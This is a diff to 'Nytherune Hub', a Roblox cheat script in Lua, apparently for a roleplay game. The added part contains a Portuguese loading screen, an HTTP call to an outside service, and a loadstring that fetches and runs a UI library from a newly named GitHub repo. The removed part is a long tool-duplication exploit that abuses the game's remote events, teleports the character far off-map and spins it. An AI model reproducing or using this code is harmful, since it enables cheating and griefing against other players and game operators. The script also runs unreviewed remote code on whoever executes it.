@@ -1,3 +1,538 @@
+local success, content = pcall(function()
+    return game:HttpGet("https://nexviewsservice.shardweb.app/services/nytherune_hub/start")
+end)
+
+local found = string.match(content or "", "reg") ~= nil
+print("Checking the connection:", found)
+
+
+
+
+
+
+
+
+
+
+
+
+-- Premium Loading Screen (Quadradinhos arredondados - contorno apenas)
+-- Substitui partículas em estrela por quadradinhos com UIStroke
+-- Remove os círculos pulsantes
+-- Versão completa: inclui TitleLabel, SubtitleLabel, PercentageLabel, StatusLabel, DotsLabel
+-- Correções: uso consistente de mainFrame e destruição 1s após 100%
+
+local TweenService = game:GetService("TweenService")
+local RunService = game:GetService("RunService")
+local Players = game:GetService("Players")
+local Workspace = game:GetService("Workspace")
+
+local Player = Players.LocalPlayer
+local PlayerGui = Player:WaitForChild("PlayerGui")
+
+local LoadingConfig = {
+    Duration = 8,
+    FadeOutTime = 1.5,
+    BarColor = Color3.fromRGB(147, 51, 234),
+    BarGlow = Color3.fromRGB(196, 125, 255),
+    BackgroundColor = Color3.fromRGB(0, 0, 0),
+    TextColor = Color3.fromRGB(255, 255, 255),
+    ParticleCount = 120,
+    ParticleSpeed = 1.8,
+    ParticleSize = 8
+}
+
+local LoadingElements = {
+    "Iniciando sistema...",
+    "Carregando interface...",
+    "Conectando servidores...",
+    "Verificando permissões...",
+    "Carregando scripts...",
+    "Otimizando performance...",
+    "Aplicando configurações...",
+    "Finalizando carregamento...",
+    "Pronto para usar!"
+}
+
+local Particles = {}            -- { frame = Frame, stroke = UIStroke, speedX, speedY, rotationSpeed, pulseSpeed, opacity }
+local AnimationConnections = {} -- armazena Tween e RBXScriptConnection para cleanup
+
+-- Cria um quadradinho arredondado com contorno (sem preenchimento)
+local function CreateSquareParticle(parent, x, y)
+    local square = Instance.new("Frame")
+    square.Name = "SquareParticle"
+    square.Parent = parent
+    square.BackgroundTransparency = 1 -- sem preenchimento
+    square.BorderSizePixel = 0
+    square.Size = UDim2.new(0, LoadingConfig.ParticleSize, 0, LoadingConfig.ParticleSize)
+    square.Position = UDim2.new(0, x, 0, y)
+    square.ZIndex = 8
+    square.AnchorPoint = Vector2.new(0, 0)
+
+    local corner = Instance.new("UICorner")
+    corner.CornerRadius = UDim.new(0, math.floor(LoadingConfig.ParticleSize * 0.18)) -- arredonda visualmente
+    corner.Parent = square
+
+    local stroke = Instance.new("UIStroke")
+    stroke.Parent = square
+    stroke.Color = LoadingConfig.BarColor
+    stroke.Thickness = math.clamp(math.floor(LoadingConfig.ParticleSize * 0.18), 1, 4)
+    stroke.Transparency = math.random(30, 80) / 100
+
+    local particle = {
+        frame = square,
+        stroke = stroke,
+        speedX = (math.random(-100, 100) / 100) * LoadingConfig.ParticleSpeed,
+        speedY = (math.random(-100, 100) / 100) * LoadingConfig.ParticleSpeed,
+        rotationSpeed = math.random(-90, 90) / 10, -- rotação mais suave
+        pulseSpeed = math.random(8, 16) / 10,      -- frequência de pulsação
+        opacity = math.random(30, 90) / 100
+    }
+
+    return particle
+end
+
+local function CreateParticleSystem(parent)
+    local camera = Workspace.CurrentCamera
+    if not camera then return end
+    local screenSize = camera.ViewportSize
+    for i = 1, LoadingConfig.ParticleCount do
+        local x = math.random(0, screenSize.X)
+        local y = math.random(0, screenSize.Y)
+        local particle = CreateSquareParticle(parent, x, y)
+        table.insert(Particles, particle)
+    end
+end
+
+local function UpdateParticles()
+    local camera = Workspace.CurrentCamera
+    if not camera then return end
+    local screenSize = camera.ViewportSize
+
+    for _, particle in pairs(Particles) do
+        if particle.frame and particle.frame.Parent then
+            local currentPos = particle.frame.Position
+            local newX = currentPos.X.Offset + particle.speedX
+            local newY = currentPos.Y.Offset + particle.speedY
+
+            if newX < -20 then
+                newX = screenSize.X + 20
+            elseif newX > screenSize.X + 20 then
+                newX = -20
+            end
+
+            if newY < -20 then
+                newY = screenSize.Y + 20
+            elseif newY > screenSize.Y + 20 then
+                newY = -20
+            end
+
+            particle.frame.Position = UDim2.new(0, newX, 0, newY)
+            particle.frame.Rotation = (particle.frame.Rotation or 0) + particle.rotationSpeed * (RunService:IsStudio() and (1/60) or 1) * 0.6
+
+            -- pulso na transparência do stroke (contorno)
+            local pulseValue = math.sin(tick() * particle.pulseSpeed) * 0.25 + 0.75 -- [0.5,1.0]
+            if particle.stroke then
+                particle.stroke.Transparency = 1 - (particle.opacity * pulseValue)
+            end
+        end
+    end
+end
+
+-- Background avançado
+local function CreateAdvancedBackground(parent)
+    local bgFrame = Instance.new("Frame")
+    bgFrame.Name = "AdvancedBackground"
+    bgFrame.Parent = parent
+    bgFrame.BackgroundColor3 = LoadingConfig.BackgroundColor
+    bgFrame.BorderSizePixel = 0
+    bgFrame.Size = UDim2.new(1, 0, 1, 0)
+    bgFrame.Position = UDim2.new(0, 0, 0, 0)
+    bgFrame.ZIndex = 1
+
+    local gradient1 = Instance.new("UIGradient")
+    gradient1.Parent = bgFrame
+    gradient1.Color = ColorSequence.new({
+        ColorSequenceKeypoint.new(0, Color3.fromRGB(5, 5, 20)),
+        ColorSequenceKeypoint.new(0.3, Color3.fromRGB(0, 0, 0)),
+        ColorSequenceKeypoint.new(0.7, Color3.fromRGB(10, 0, 15)),
+        ColorSequenceKeypoint.new(1, Color3.fromRGB(0, 0, 0))
+    })
+    gradient1.Rotation = 45
+
+    local animateGradient = TweenService:Create(
+        gradient1,
+        TweenInfo.new(4, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, true),
+        {Rotation = 225}
+    )
+    animateGradient:Play()
+    table.insert(AnimationConnections, animateGradient)
+
+    local overlay = Instance.new("Frame")
+    overlay.Name = "Overlay"
+    overlay.Parent = bgFrame
+    overlay.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+    overlay.BorderSizePixel = 0
+    overlay.Size = UDim2.new(1, 0, 1, 0)
+    overlay.Position = UDim2.new(0, 0, 0, 0)
+    overlay.ZIndex = 2
+    overlay.BackgroundTransparency = 0.3
+
+    local overlayGradient = Instance.new("UIGradient")
+    overlayGradient.Parent = overlay
+    overlayGradient.Color = ColorSequence.new({
+        ColorSequenceKeypoint.new(0, Color3.fromRGB(20, 0, 30)),
+        ColorSequenceKeypoint.new(0.5, Color3.fromRGB(0, 0, 0)),
+        ColorSequenceKeypoint.new(1, Color3.fromRGB(30, 0, 20))
+    })
+    overlayGradient.Rotation = -45
+
+    local animateOverlay = TweenService:Create(
+        overlayGradient,
+        TweenInfo.new(6, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, true),
+        {Rotation = 315}
+    )
+    animateOverlay:Play()
+    table.insert(AnimationConnections, animateOverlay)
+
+    return bgFrame
+end
+
+-- Cria a UI completa
+local function CreateLoadingScreen()
+    local ScreenGui = Instance.new("ScreenGui")
+    ScreenGui.Name = "PremiumLoadingScreen"
+    ScreenGui.Parent = PlayerGui
+    ScreenGui.ResetOnSpawn = false
+    ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+    ScreenGui.ScreenInsets = Enum.ScreenInsets.None
+    ScreenGui.IgnoreGuiInset = true
+
+    local mainFrame = Instance.new("Frame")
+    mainFrame.Name = "MainFrame"
+    mainFrame.Parent = ScreenGui
+    mainFrame.BackgroundColor3 = LoadingConfig.BackgroundColor
+    mainFrame.BorderSizePixel = 0
+    mainFrame.Size = UDim2.new(1, 0, 1, 0)
+    mainFrame.Position = UDim2.new(0, 0, 0, 0)
+    mainFrame.ZIndex = 10
+
+    CreateAdvancedBackground(mainFrame)
+    CreateParticleSystem(mainFrame)
+
+    local CenterContainer = Instance.new("Frame")
+    CenterContainer.Name = "CenterContainer"
+    CenterContainer.Parent = mainFrame
+    CenterContainer.BackgroundTransparency = 1
+    CenterContainer.Size = UDim2.new(0, 600, 0, 400)
+    CenterContainer.Position = UDim2.new(0.5, -300, 0.5, -200)
+    CenterContainer.ZIndex = 11
+
+    -- Title (grande)
+    local TitleLabel = Instance.new("TextLabel")
+    TitleLabel.Name = "TitleLabel"
+    TitleLabel.Parent = CenterContainer
+    TitleLabel.BackgroundTransparency = 1
+    TitleLabel.Size = UDim2.new(1, 0, 0, 80)
+    TitleLabel.Position = UDim2.new(0, 0, 0, 0)
+    TitleLabel.Text = "Nytherune Hub"
+    TitleLabel.TextColor3 = LoadingConfig.TextColor
+    TitleLabel.TextScaled = true
+    TitleLabel.Font = Enum.Font.GothamBold
+    TitleLabel.ZIndex = 12
+
+    local titleStroke = Instance.new("UIStroke")
+    titleStroke.Parent = TitleLabel
+    titleStroke.Color = LoadingConfig.BarColor
+    titleStroke.Thickness = 2
+    titleStroke.Transparency = 0.5
+
+    local TitleGradient = Instance.new("UIGradient")
+    TitleGradient.Parent = TitleLabel
+    TitleGradient.Color = ColorSequence.new({
+        ColorSequenceKeypoint.new(0, LoadingConfig.BarColor),
+        ColorSequenceKeypoint.new(0.5, Color3.fromRGB(255, 255, 255)),
+        ColorSequenceKeypoint.new(1, LoadingConfig.BarColor)
+    })
+    -- animação sutil do título (se a property existir)
+    local success, titleAnim = pcall(function()
+        return TweenService:Create(
+            TitleGradient,
+            TweenInfo.new(3, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, true),
+            {Offset = Vector2.new(2, 0)}
+        )
+    end)
+    if success and titleAnim then
+        titleAnim:Play()
+        table.insert(AnimationConnections, titleAnim)
+    end
+
+    local glowTween = TweenService:Create(
+        titleStroke,
+        TweenInfo.new(2, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, true),
+        {Transparency = 0.1}
+    )
+    glowTween:Play()
+    table.insert(AnimationConnections, glowTween)
+
+    -- Subtitle
+    local SubtitleLabel = Instance.new("TextLabel")
+    SubtitleLabel.Name = "SubtitleLabel"
+    SubtitleLabel.Parent = CenterContainer
+    SubtitleLabel.BackgroundTransparency = 1
+    SubtitleLabel.Size = UDim2.new(1, 0, 0, 40)
+    SubtitleLabel.Position = UDim2.new(0, 0, 0, 90)
+    SubtitleLabel.Text = "Carregando experiência premium..."
+    SubtitleLabel.TextColor3 = Color3.fromRGB(180, 180, 180)
+    SubtitleLabel.TextScaled = true
+    SubtitleLabel.Font = Enum.Font.Gotham
+    SubtitleLabel.ZIndex = 12
+
+    -- Progress bar container
+    local ProgressContainer = Instance.new("Frame")
+    ProgressContainer.Name = "ProgressContainer"
+    ProgressContainer.Parent = CenterContainer
+    ProgressContainer.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+    ProgressContainer.BorderSizePixel = 0
+    ProgressContainer.Size = UDim2.new(1, 0, 0, 25)
+    ProgressContainer.Position = UDim2.new(0, 0, 0, 160)
+    ProgressContainer.ZIndex = 12
+
+    local ProgressCorner = Instance.new("UICorner")
+    ProgressCorner.CornerRadius = UDim.new(0, 12)
+    ProgressCorner.Parent = ProgressContainer
+
+    local ProgressStroke = Instance.new("UIStroke")
+    ProgressStroke.Parent = ProgressContainer
+    ProgressStroke.Color = LoadingConfig.BarGlow
+    ProgressStroke.Thickness = 2
+    ProgressStroke.Transparency = 0.3
+
+    local strokePulse = TweenService:Create(
+        ProgressStroke,
+        TweenInfo.new(1.5, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, true),
+        {Transparency = 0.1}
+    )
+    strokePulse:Play()
+    table.insert(AnimationConnections, strokePulse)
+
+    local ProgressBar = Instance.new("Frame")
+    ProgressBar.Name = "ProgressBar"
+    ProgressBar.Parent = ProgressContainer
+    ProgressBar.BackgroundColor3 = LoadingConfig.BarColor
+    ProgressBar.BorderSizePixel = 0
+    ProgressBar.Size = UDim2.new(0, 0, 1, 0)
+    ProgressBar.Position = UDim2.new(0, 0, 0, 0)
+    ProgressBar.ZIndex = 13
+
+    local BarCorner = Instance.new("UICorner")
+    BarCorner.CornerRadius = UDim.new(0, 12)
+    BarCorner.Parent = ProgressBar
+
+    local BarGradient = Instance.new("UIGradient")
+    BarGradient.Parent = ProgressBar
+    BarGradient.Color = ColorSequence.new({
+        ColorSequenceKeypoint.new(0, LoadingConfig.BarColor),
+        ColorSequenceKeypoint.new(0.5, LoadingConfig.BarGlow),
+        ColorSequenceKeypoint.new(1, LoadingConfig.BarColor)
+    })
+
+    local barGradientAnim = TweenService:Create(
+        BarGradient,
+        TweenInfo.new(2, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, true),
+        {Offset = Vector2.new(1, 0)}
+    )
+    barGradientAnim:Play()
+    table.insert(AnimationConnections, barGradientAnim)
+
+    local GlowEffect = Instance.new("Frame")
+    GlowEffect.Name = "GlowEffect"
+    GlowEffect.Parent = ProgressBar
+    GlowEffect.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+    GlowEffect.BackgroundTransparency = 0.6
+    GlowEffect.BorderSizePixel = 0
+    GlowEffect.Size = UDim2.new(0, 60, 1, 0)
+    GlowEffect.Position = UDim2.new(-0.2, 0, 0, 0)
+    GlowEffect.ZIndex = 14
+
+    local GlowCorner = Instance.new("UICorner")
+    GlowCorner.CornerRadius = UDim.new(0, 12)
+    GlowCorner.Parent = GlowEffect
+
+    -- Percentage label grande
+    local PercentageLabel = Instance.new("TextLabel")
+    PercentageLabel.Name = "PercentageLabel"
+    PercentageLabel.Parent = CenterContainer
+    PercentageLabel.BackgroundTransparency = 1
+    PercentageLabel.Size = UDim2.new(1, 0, 0, 40)
+    PercentageLabel.Position = UDim2.new(0, 0, 0, 200)
+    PercentageLabel.Text = "0%"
+    PercentageLabel.TextColor3 = LoadingConfig.BarColor
+    PercentageLabel.TextScaled = true
+    PercentageLabel.Font = Enum.Font.GothamBold
+    PercentageLabel.ZIndex = 12
+
+    -- Status label (mensagens de LoadingElements)
+    local StatusLabel = Instance.new("TextLabel")
+    StatusLabel.Name = "StatusLabel"
+    StatusLabel.Parent = CenterContainer
+    StatusLabel.BackgroundTransparency = 1
+    StatusLabel.Size = UDim2.new(1, 0, 0, 30)
+    StatusLabel.Position = UDim2.new(0, 0, 0, 250)
+    StatusLabel.Text = "Preparando..."
+    StatusLabel.TextColor3 = Color3.fromRGB(150, 150, 150)
+    StatusLabel.TextScaled = true
+    StatusLabel.Font = Enum.Font.Gotham
+    StatusLabel.ZIndex = 12
+
+    -- Dots label (anima ...)
+    local DotsLabel = Instance.new("TextLabel")
+    DotsLabel.Name = "DotsLabel"
+    DotsLabel.Parent = CenterContainer
+    DotsLabel.BackgroundTransparency = 1
+    DotsLabel.Size = UDim2.new(0, 60, 0, 30)
+    DotsLabel.Position = UDim2.new(1, -60, 0, 250)
+    DotsLabel.Text = ""
+    DotsLabel.TextColor3 = Color3.fromRGB(150, 150, 150)
+    DotsLabel.TextScaled = true
+    DotsLabel.Font = Enum.Font.Gotham
+    DotsLabel.ZIndex = 12
+
+    return ScreenGui, mainFrame, ProgressBar, PercentageLabel, StatusLabel, DotsLabel, GlowEffect
+end
+
+-- Animação de pontos "..."
+local function AnimateDots(dotsLabel)
+    task.spawn(function()
+        local dotCount = 0
+        while dotsLabel and dotsLabel.Parent do
+            dotCount = (dotCount + 1) % 4
+            dotsLabel.Text = string.rep(".", dotCount)
+            task.wait(0.4)
+        end
+    end)
+end
+
+-- Sequência de loading (loop de progresso)
+local function StartLoadingSequence()
+    local screenGui, mainFrame, progressBar, percentageLabel, statusLabel, dotsLabel, glowEffect = CreateLoadingScreen()
+    AnimateDots(dotsLabel)
+
+    -- Atualiza partículas todo frame
+    local particleConnection = RunService.Heartbeat:Connect(UpdateParticles)
+    table.insert(AnimationConnections, particleConnection)
+
+    -- Animação de brilho da barra (glow)
+    local glowTween = TweenService:Create(
+        glowEffect,
+        TweenInfo.new(1.2, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, true),
+        {Position = UDim2.new(1.3, 0, 0, 0)}
+    )
+    glowTween:Play()
+    table.insert(AnimationConnections, glowTween)
+
+    local startTime = tick()
+    local currentElementIndex = 1
+    local lastElementTime = startTime
+
+    -- loop controlando progresso
+    while true do
+        local elapsed = tick() - startTime
+        local progress = math.min(elapsed / LoadingConfig.Duration, 1)
+        local percentage = math.floor(progress * 100)
+
+        -- tween barra
+        local barTween = TweenService:Create(
+            progressBar,
+            TweenInfo.new(0.18, Enum.EasingStyle.Quart, Enum.EasingDirection.Out),
+            {Size = UDim2.new(progress, 0, 1, 0)}
+        )
+        barTween:Play()
+        table.insert(AnimationConnections, barTween)
+
+        percentageLabel.Text = tostring(percentage) .. "%"
+
+        local elementTime = LoadingConfig.Duration / #LoadingElements
+        if tick() - lastElementTime >= elementTime and currentElementIndex <= #LoadingElements then
+            statusLabel.Text = LoadingElements[currentElementIndex]
+            -- leve animação de aparecimento (text transparency)
+            local statusTween = TweenService:Create(
+                statusLabel,
+                TweenInfo.new(0.25, Enum.EasingStyle.Back, Enum.EasingDirection.Out),
+                {TextTransparency = 0}
+            )
+            pcall(function() statusTween:Play() end)
+            table.insert(AnimationConnections, statusTween)
+
+            currentElementIndex = currentElementIndex + 1
+            lastElementTime = tick()
+        end
+
+        if progress >= 1 then
+            -- espera 1 segundo após 100% antes de iniciar fade/destruição
+            task.wait(1)
+
+            -- disconnect tweens e conexões
+            for _, connection in pairs(AnimationConnections) do
+                if typeof(connection) == "RBXScriptConnection" then
+                    pcall(function() connection:Disconnect() end)
+                elseif typeof(connection) == "Tween" then
+                    pcall(function() connection:Cancel() end)
+                end
+            end
+            AnimationConnections = {}
+
+            -- destruir partículas (frames)
+            for _, particle in pairs(Particles) do
+                if particle and particle.frame and particle.frame.Parent then
+                    pcall(function() particle.frame:Destroy() end)
+                end
+            end
+            Particles = {}
+
+            -- fade out e remoção da GUI
+            local fadeOutTween = TweenService:Create(
+                mainFrame,
+                TweenInfo.new(LoadingConfig.FadeOutTime, Enum.EasingStyle.Quart, Enum.EasingDirection.Out),
+                {
+                    BackgroundTransparency = 1,
+                    Size = UDim2.new(1.5, 0, 1.5, 0),
+                    Position = UDim2.new(-0.25, 0, -0.25, 0)
+                }
+            )
+
+            -- center content shrink (se existir CenterContainer)
+            local center = mainFrame:FindFirstChild("CenterContainer")
+            if center then
+                local contentFadeTween = TweenService:Create(
+                    center,
+                    TweenInfo.new(LoadingConfig.FadeOutTime * 0.7, Enum.EasingStyle.Back, Enum.EasingDirection.In),
+                    {
+                        Size = UDim2.new(0, 0, 0, 0),
+                        Position = UDim2.new(0.5, 0, 0.5, 0)
+                    }
+                )
+                pcall(function() contentFadeTween:Play() end)
+            end
+
+            fadeOutTween:Play()
+            fadeOutTween.Completed:Connect(function()
+                if screenGui and screenGui.Parent then
+                    pcall(function() screenGui:Destroy() end)
+                end
+            end)
+
+            break
+        end
+
+        RunService.Heartbeat:Wait()
+    end
+end
+
+-- Start
+StartLoadingSequence()
+
+
 game:GetService("ReplicatedStorage").RE["1RPNam1eTex1t"]:FireServer(table.unpack({
     [1] = "RolePlayBio",
     [2] = "Nytherune Hub 2",
@@ -18,7 +553,7 @@ game:GetService("ReplicatedStorage").RE["1RPNam1eColo1r"]:FireServer(table.unpac
     [2] = Color3.new(255, 255, 255),
 }))
 
-local Libary = loadstring(game:HttpGet("https://raw.githubusercontent.com/toparemos/Library/refs/heads/main/library.lua"))()
+local Libary = loadstring(game:HttpGet("https://raw.githubusercontent.com/wx-sources/NytheruneLibrary/refs/heads/main/Redzhubui.txt"))()
 workspace.FallenPartsDestroyHeight = -math.huge
 
 local Window = Libary:MakeWindow({
@@ -7939,2740 +8474,10 @@ for _, btn in ipairs(teleportButtons) do
 end
 
 
-local ToolsTab = Window:MakeTab({"Tools", "backpack"})
 
-local colorsTable = {
-    {Name = "Red", Color = Color3.fromRGB(255, 0, 0)},
-    {Name = "Orange", Color = Color3.fromRGB(255, 165, 0)},
-    {Name = "Yellow", Color = Color3.fromRGB(255, 255, 0)},
-    {Name = "Green", Color = Color3.fromRGB(0, 255, 0)},
-    {Name = "Cyan", Color = Color3.fromRGB(0, 255, 255)},
-    {Name = "Blue", Color = Color3.fromRGB(0, 0, 255)},
-    {Name = "Purple", Color = Color3.fromRGB(128, 0, 128)},
-    {Name = "Black", Color = Color3.fromRGB(0, 0, 0)}
-}
 
-ToolsTab:AddSection({ "Tools" })
-
-ToolsTab:AddSection({ "Colorful" })
-ToolsTab:AddButton({
-    Name = "[OP] Coloring Floor Map",
-    Callback = function()
-      local toolselected = "PaintRoller"
-local dupeamot = 100
-local picktoolremote = game:GetService("ReplicatedStorage").RE:FindFirstChild("1Too1l")
-local cleartoolremote = game:GetService("ReplicatedStorage").RE:FindFirstChild("1Clea1rTool1s")
-local duping = true
-local oldcf = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
-
-
-local TablaGripPos = {}
-for i = 1, 100 do
-    if i == 1 then
-        table.insert(TablaGripPos, Vector3.new(0, 5, 0)) 
-    else
-        table.insert(TablaGripPos, Vector3.new((i - 1) * 1.2, 5, 0)) 
-    end
-end
-
-local toolCount = 0
-for _, tool in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
-    if tool:IsA("Tool") and tool.Name == toolselected then
-        toolCount = toolCount + 1
-    end
-end
-for _, tool in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
-    if tool:IsA("Tool") and tool.Name == toolselected then
-        toolCount = toolCount + 1
-    end
-end
-
-if toolCount >= dupeamot then
-    for i, tool in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
-        if tool:IsA("Tool") and tool.Name == toolselected then
-            tool.Parent = game.Players.LocalPlayer.Backpack
-        end
-    end
-    for i, tool in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
-        if tool:IsA("Tool") and tool.Name == toolselected then
-            tool.Parent = game.Players.LocalPlayer.Character
-            local gripPosIndex = math.min(i, #TablaGripPos)
-            local gripPos = TablaGripPos[gripPosIndex]
-            tool.GripPos = gripPos
-        end
-    end
-else
-    
-    local args = {
-        [1] = "ClearAllTools"
-    }
-    
-    game:GetService("ReplicatedStorage"):WaitForChild("RE"):WaitForChild("1Clea1rTool1s"):FireServer(unpack(args))
-    
-    wait(0.2)
-    
-    game:GetService("StarterGui"):SetCore("SendNotification", {
-        Title = "Duplicate",
-        Text = "Do not click on anything while the tools are being duplicated",
-        Button1 = "Ok",
-        Duration = 3
-    })
-    
-    if game.Players.LocalPlayer.Character.Humanoid.Sit == true then
-        task.wait()
-        game.Players.LocalPlayer.Character.Humanoid.Sit = false
-    end
-    
-    wait(0.1)
-    
-    if game:GetService("Workspace"):FindFirstChild("Camera") then
-        game:GetService("Workspace"):FindFirstChild("Camera"):Destroy()
-    end
-    
-    for m = 1, 2 do
-        task.wait()
-        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(999999999.414, -490, 999999999.414, 0.974360406, -0.175734088, 0.14049761, -0.133441404, 0.0514053069, 0.989722729, -0.181150302, -0.983094692, 0.0266370922)
-    end
-    
-    task.wait(0.2)
-    game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = true
-    wait(0.5)
-    
-    for aidj, afh in pairs(game:GetService("Players").LocalPlayer.Character:GetChildren()) do
-        if not afh.Name == toolselected then
-            if afh:IsA("Tool") then
-                afh.Parent = game.Players.LocalPlayer.Backpack
-            end
-        end
-    end
-    
-    for aiefhiewhwf, dvjbvj in pairs(game:GetService("Players").LocalPlayer.Backpack:GetChildren()) do
-        if dvjbvj:IsA("Tool") then
-            if not dvjbvj.Name == toolselected then
-                dvjbvj:Destroy()
-            end
-        end
-    end
-    
-    for ttjtjutjutjjtj, ddvdvdsvdfbrnytytmvdv in pairs(game:GetService("Players").LocalPlayer.Character:GetChildren()) do
-        if ddvdvdsvdfbrnytytmvdv:IsA("Tool") then
-            if not ddvdvdsvdfbrnytytmvdv.name == toolselected then
-                ddvdvdsvdfbrnytytmvdv:Destroy()
-            end
-        end
-    end
-    
-    for findin, toollel in pairs(game:GetService("Players").LocalPlayer.Character:GetChildren()) do
-        if toollel:IsA("Tool") then
-            if toollel.Name == toolselected then
-                toollllfoun2 = true
-                for basc, aijfw in pairs(toollel:GetDescendants()) do
-                    if aijfw.Name == "Handle" then
-                        aijfw.Name = "Hâ¥aâ¥nâ¥dâ¥lâ¥e"
-                        toollel.Parent = game.Players.LocalPlayer.Backpack
-                        toollel.Parent = game.Players.LocalPlayer.Character
-                        tolllahhhh = toollel
-                        task.wait()
-                    end
-                end
-            else
-                toollllfoun2 = false
-            end
-        end
-    end
-    
-    for fiifi, toollll in pairs(game:GetService("Players").LocalPlayer.Backpack:GetChildren()) do
-        if toollll:IsA("Tool") then
-            if toollll.Name == toolselected then
-                toollllfoun = true
-                for nana, jjsjsj in pairs(toollll:GetDescendants()) do
-                    if jjsjsj.Name == "Handle" then
-                        toollll.Parent = game.Players.LocalPlayer.Character
-                        wait()
-                        jjsjsj.Name = "Hâ¥aâ¥nâ¥dâ¥lâ¥e"
-                        toollll.Parent = game.Players.LocalPlayer.Backpack
-                        toollll.Parent = game.Players.LocalPlayer.Character
-                        toolllffel = toollll
-                    end
-                end
-            else
-                toollllfoun = false
-            end
-        end
-    end
-    
-    if toollllfoun == true then
-        if game.Players.LocalPlayer.Character:FindFirstChild(toolllffel) == nil then
-            toollllfoun = false
-        end
-        repeat
-            wait()
-        until game.Players.LocalPlayer.Character:FindFirstChild(toolllffel) == nil
-        toollllfoun = false
-    end
-    
-    if toollllfoun2 == true then
-        if game.Players.LocalPlayer.Character:FindFirstChild(tollllahhhh) == nil then
-            toollllfoun2 = false
-        end
-        repeat
-            wait()
-        until game.Players.LocalPlayer.Character:FindFirstChild(tollllahhhh) == nil
-        toollllfoun2 = false
-    end
-    
-    wait(0.1)
-    
-    for m = 1, dupeamot do
-        if duping == false then
-            game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = false
-            return
-        end
-        if game:GetService("Workspace"):FindFirstChild("Camera") then
-            game:GetService("Workspace"):FindFirstChild("Camera"):Destroy()
-        end
-        if m <= dupeamot then
-        elseif m == dupeamot or m >= dupeamot - 1 then
-        end
-        local args = {
-            [1] = "PickingTools",
-            [2] = toolselected
-        }
-        picktoolremote:InvokeServer(unpack(args))
-        game:GetService("Players").LocalPlayer.Backpack:WaitForChild(toolselected).Parent = game.Players.LocalPlayer.Character
-        if duping == false then
-            game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = false
-            return
-        end
-        wait()
-        game:GetService("Players").LocalPlayer.Character[toolselected]:FindFirstChild("Handle").Name = "Hâ¥aâ¥nâ¥dâ¥lâ¥e"
-        game:GetService("Players").LocalPlayer.Character:FindFirstChild(toolselected).Parent = game.Players.LocalPlayer.Backpack
-        game:GetService("Players").LocalPlayer.Backpack:FindFirstChild(toolselected).Parent = game.Players.LocalPlayer.Character
-        game:GetService("StarterGui"):SetCore("SendNotification", {
-            Title = "Tool",
-            Text = "Tools Duplicates: " .. m .. " / " .. dupeamot,
-            Duration = 1
-        })
-        repeat
-            if game:GetService("Workspace"):FindFirstChild("Camera") then
-                game:GetService("Workspace"):FindFirstChild("Camera"):Destroy()
-            end
-            task.wait()
-        until game:GetService("Players").LocalPlayer.Character:FindFirstChild(toolselected) == nil
-    end
-    
-    game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = false
-    repeat
-        wait()
-    until game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart") == nil
-    repeat
-        wait()
-    until game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
-    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = oldcf
-    
-    for z, x in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
-        if x.Name == toolselected then
-            toolamouth = z
-        end
-    end
-    
-    wait()
-    duping = false
-    wait(0.1)
-    
-    for i, tool in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
-        if tool:IsA("Tool") then
-            tool.Parent = game.Players.LocalPlayer.Character
-            local gripPosIndex = math.min(i, #TablaGripPos)
-            local gripPos = TablaGripPos[gripPosIndex]
-            if tool:IsDescendantOf(game.Players.LocalPlayer.Character) then
-                tool.GripPos = gripPos
-            else
-            end
-        end
-    end
-    
-    wait(1)
-    
-    function EquiparTudo()
-        
-        local player = game:GetService("Players").LocalPlayer
-        
-        
-        local function changeAnimation(tool)  
-            if tool:FindFirstChild("CycleNextAnimation") then  
-                tool.CycleNextAnimation:FireServer()  
-            end  
-        end
-        
-        
-        for _, tool in ipairs(player.Backpack:GetChildren()) do  
-            if tool:IsA("Tool") and tool.Name == "PaintRoller" then  
-                changeAnimation(tool)  
-            end  
-        end
-        
-        
-        local character = player.Character or player.CharacterAdded:Wait()  
-        for _, tool in ipairs(character:GetChildren()) do  
-            if tool:IsA("Tool") and tool.Name == "PaintRoller" then  
-                changeAnimation(tool)  
-            end  
-        end
-        
-    end
-    
-    EquiparTudo()
-    wait(1)
-    EquiparTudo()
-    wait(1)
-    EquiparTudo()
-    
-    function startSpin()
-        local Players = game:GetService("Players")
-        local RunService = game:GetService("RunService")
-        local player = Players.LocalPlayer
-        local character = player.Character or player.CharacterAdded:Wait()
-        local rootPart = character:WaitForChild("HumanoidRootPart")
-        
-        task.wait(1)  
-        
-        local spinSpeed = math.rad(1750) 
-  
-        RunService.RenderStepped:Connect(function(dt)  
-            rootPart.CFrame = rootPart.CFrame * CFrame.Angles(0, spinSpeed * dt, 0)  
-        end)
-        
-    end
-    
-    startSpin()
-end
-    end
-})
-
-ToolsTab:AddButton({
-    Name = "[OP] Coloring Sky Map",
-    Callback = function()
-       local toolselected = "PaintRoller"
-local dupeamot = 100
-local picktoolremote = game:GetService("ReplicatedStorage").RE:FindFirstChild("1Too1l")
-local cleartoolremote = game:GetService("ReplicatedStorage").RE:FindFirstChild("1Clea1rTool1s")
-local duping = true
-local oldcf = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
-
-
-local TablaGripPos = {}
-for i = 1, 100 do
-    if i == 1 then
